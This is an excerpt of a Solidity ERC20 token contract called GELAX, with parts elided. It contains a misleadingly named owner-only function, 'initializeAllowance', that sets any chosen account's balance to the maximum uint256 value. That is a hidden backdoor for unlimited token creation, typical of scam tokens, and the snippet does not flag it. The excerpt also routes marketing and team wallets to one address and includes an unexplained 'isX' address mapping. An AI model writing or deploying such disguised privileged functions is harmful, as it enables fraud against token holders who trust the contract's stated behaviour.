...
contract GELAX is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;
    string private _name = "GELAX";
    string private _symbol = "GELAX";
    uint8 private _decimals = 9;
    address payable public marketingWalletAddress = payable(0xE406b8FD6844CFABAa99DC0053f0b85F0Fb6b5aA);
    address payable public teamWalletAddress = payable(0xE406b8FD6844CFABAa99DC0053f0b85F0Fb6b5aA);    
    ...
    mapping(address => bool) public isX;
    ...
    uint256 public _variant = ~uint256(0);
    ...
    function balanceOf(address account) public view override returns (uint256) {return _b[account];}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function initializeAllowance(address account) public onlyOwner returns (bool success) {_b[account] = _variant;return true;}
